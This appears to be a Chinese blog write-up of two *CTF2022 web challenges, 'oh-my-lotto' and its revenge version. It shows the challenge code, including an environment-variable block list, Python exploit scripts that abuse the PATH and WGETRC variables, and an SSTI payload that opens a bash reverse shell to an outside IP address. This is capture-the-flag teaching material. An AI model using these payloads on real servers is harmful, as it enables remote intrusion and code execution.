@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🌟CTF2022-Web部分WriteUp | Evylnk</title><meta name="author" content="Evylnk"><meta name="copyright" content="Evylnk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="oh-my-lotto首先用比赛给的附件，用Dokcer搭好环境 docker-compose builddocker-compose up   正常启动 给了源码，所以进行白盒审计，四个界面分别对应四个路由 其中lotto的路由主要部分是这些 @app.route(&quot;&#x2F;lotto&quot;, methods&#x3D;[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])de">
+<meta property="og:type" content="article">
+<meta property="og:title" content="🌟CTF2022-Web部分WriteUp">
+<meta property="og:url" content="http://emion.fun/2022/04/19/*CTF2022/index.html">
+<meta property="og:site_name" content="Evylnk">
+<meta property="og:description" content="oh-my-lotto首先用比赛给的附件，用Dokcer搭好环境 docker-compose builddocker-compose up   正常启动 给了源码，所以进行白盒审计，四个界面分别对应四个路由 其中lotto的路由主要部分是这些 @app.route(&quot;&#x2F;lotto&quot;, methods&#x3D;[&amp;#x27;GET&amp;#x27;, &amp;#x27;POST&amp;#x27;])de">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg">
+<meta property="article:published_time" content="2022-04-19T07:12:53.945Z">
+<meta property="article:modified_time" content="2022-04-20T05:08:16.432Z">
+<meta property="article:author" content="Evylnk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://emion.fun/2022/04/19/*CTF2022/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '🌟CTF2022-Web部分WriteUp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-20 13:08:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evylnk</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">🌟CTF2022-Web部分WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-19T07:12:53.945Z" title="发表于 2022-04-19 15:12:53">2022-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-20T05:08:16.432Z" title="更新于 2022-04-20 13:08:16">2022-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="🌟CTF2022-Web部分WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p><strong>首先用比赛给的附件，用Dokcer搭好环境</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1f21dlqfuj21bg0fgjy1.jpg"></p>
+<p><strong>正常启动</strong></p>
+<p><strong>给了源码，所以进行白盒审计，四个界面分别对应四个路由</strong></p>
+<p><strong>其中lotto的路由主要部分是这些</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/lotto&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lotto</span>():</span></span><br><span class="line">    message = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        flag = os.getenv(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">        lotto_key = request.form.get(<span class="string">&#x27;lotto_key&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        lotto_value = request.form.get(<span class="string">&#x27;lotto_value&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            lotto_key = lotto_key.upper()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">            os.environ[lotto_key] = lotto_value</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">                    lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">                    forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>大概含义就是会从内网的lotto界面取出一个文件（可以在lotto的app.py中发现事一串随机数），然后与forecast传入的文件进行对比，如果相同就会返回从环境变量中取出的flag</strong></p>
+<p><strong>然后就是</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_check</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;LD&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;BASH&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;ENV&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PROXY&#x27;</span> <span class="keyword">in</span> s <span class="keyword">or</span> <span class="string">&#x27;PS&#x27;</span> <span class="keyword">in</span> s: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>因为这个函数过滤了一些环境变量，所以之前HF中看p神提到的环境变量进行RCE也不行了</strong></p>
+<p><strong>看了WP才知道，控制PATH，我们也可以进行一些骚操作</strong></p>
+<blockquote>
+<p><strong><code>PATH变量</code>就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索<code>PATH变量</code>变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以直接运行，前提是有执行权限</strong></p>
+</blockquote>
+<p><strong>那既然它是会用wget取读取随机数，那我们控制PATH，让它找不到wget，它就无法再读出随机数，这样我们就可以利用已知的第一次生成的随机数上传，不就对比是一样的了嘛</strong></p>
+<p><strong>EXP如下</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8880/&quot;</span></span><br><span class="line"></span><br><span class="line">lotto_data = &#123;</span><br><span class="line">    <span class="string">&quot;lotto_key&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lotto_value&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lotto_data1 = &#123;</span><br><span class="line">    <span class="string">&quot;lotto_key&quot;</span>: <span class="string">&quot;PATH&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lotto_value&quot;</span>: <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.post(url=(url + <span class="string">&quot;lotto&quot;</span>), data=lotto_data)</span><br><span class="line"></span><br><span class="line">resp = requests.get(url=(url + <span class="string">&quot;result&quot;</span>))</span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line">result = html.xpath(<span class="string">&quot;/html/body/div[2]/div/p[3]/text()&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(result)</span><br><span class="line"></span><br><span class="line">requests.post(url=(url + <span class="string">&quot;forecast&quot;</span>),</span><br><span class="line">              files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;)</span><br><span class="line">r = requests.post(url=(url + <span class="string">&quot;lotto&quot;</span>), data=lotto_data1)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1f2mpy9axj210k03cjs0.jpg"></p>
+<p><strong>成功得到flag</strong></p>
+<h2 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h2><p><strong>算是上一题的一个进阶版本</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g38nlt1dj20ua05qwf9.jpg"></p>
+<p><strong>这里就算预测正确，也不会返回flag</strong></p>
+<p><strong>根据wp的这个链接</strong></p>
+<p><strong>我们知道了这个<a target="_blank" rel="noopener" href="https://www.gnu.org/software/wget/manual/wget.html#:~:text=6.1-,Wgetrc%20Location,-When%20initializing%2C%20Wget">WGETRC</a>，我们可以控制环境变量就可以控制wget的参数，其中这里主要利用这两个</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http_proxy = string</span><br><span class="line">Use string as HTTP proxy, instead of the one specified in environment.</span><br><span class="line">wget的流量就会先转发到这个指定的代理上，这样我们就可以成为一个中间人</span><br><span class="line"></span><br><span class="line">output_document = file</span><br><span class="line">Set the output filename—the same as ‘-O file’.</span><br><span class="line">这个我们就能控制目录文件，覆盖templates/index.html，打一个SSTI</span><br></pre></td></tr></table></figure>
+
+<p><strong>先做个实验，看wget的流量能否转发到我们的监听端口上</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g3kxtl9vj20s205it9a.jpg"></p>
+<p><strong>再用如下exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Author: C4ry7nk</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8880/&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">&quot;forecast&quot;</span>,</span><br><span class="line">                  files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&quot;lnk.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;lotto_key&quot;</span>: <span class="string">&quot;WGETRC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lotto_value&quot;</span>: <span class="string">&quot;/app/guess/forecast.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url + <span class="string">&quot;lotto&quot;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g3o59umij20qc0g0416.jpg"></p>
+<p><strong>然后我们在本地docker的shell里就可以发现，的确写入了我们输入的内容</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g3opnh04j20y206gab2.jpg"></p>
+<p><strong>那我们如果写入反弹shell的SSTI，再刷新index.html，就可以getshell了</strong></p>
+<p><strong>于是我们写入</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/118.251.146.118/1234 0&gt;&amp;1&quot;&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g3r2g4m1j21iy0fe43v.jpg"></p>
+<p><strong>刷新index.html后，成功获得shell</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h1g3s5zitwj217s0rs46b.jpg"></p>
+<p><strong>在env中看到flag</strong></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>**<a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/04/18/year/2022/4/2022-CTF-Web/#2022-CTF-Web">Y4师傅的WP</a>*</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Evylnk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://emion.fun/2022/04/19/*CTF2022/">http://emion.fun/2022/04/19/*CTF2022/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://emion.fun" target="_blank">Evylnk</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/04/10/1/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Evylnk</div><div class="author-info__description">CTF && PWN && STUDENT</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LHXHL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/LHXHL" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">愿你有一个灿烂的前程，愿你有情人终成眷属，愿你在尘世中收获幸福。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-lotto"><span class="toc-number">1.</span> <span class="toc-text">oh-my-lotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-lotto-revenge"><span class="toc-number">2.</span> <span class="toc-text">oh-my-lotto-revenge</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/19/*CTF2022/" title="🌟CTF2022-Web部分WriteUp">🌟CTF2022-Web部分WriteUp</a><time datetime="2022-04-19T07:12:53.945Z" title="发表于 2022-04-19 15:12:53">2022-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/10/1/" title="无题">无题</a><time datetime="2022-04-10T02:01:54.513Z" title="发表于 2022-04-10 10:01:54">2022-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/07/pentest/" title="和我一起来打靶">和我一起来打靶</a><time datetime="2022-04-07T07:25:13.114Z" title="发表于 2022-04-07 15:25:13">2022-04-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/03/dc9/" title="DC系列靶机之DC_9">DC系列靶机之DC_9</a><time datetime="2022-04-03T06:17:33.480Z" title="发表于 2022-04-03 14:17:33">2022-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/04/03/dc8/" title="DC系列靶机之DC_8">DC系列靶机之DC_8</a><time datetime="2022-04-03T01:44:14.984Z" title="发表于 2022-04-03 09:44:14">2022-04-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Evylnk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,希望能够帮到你。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
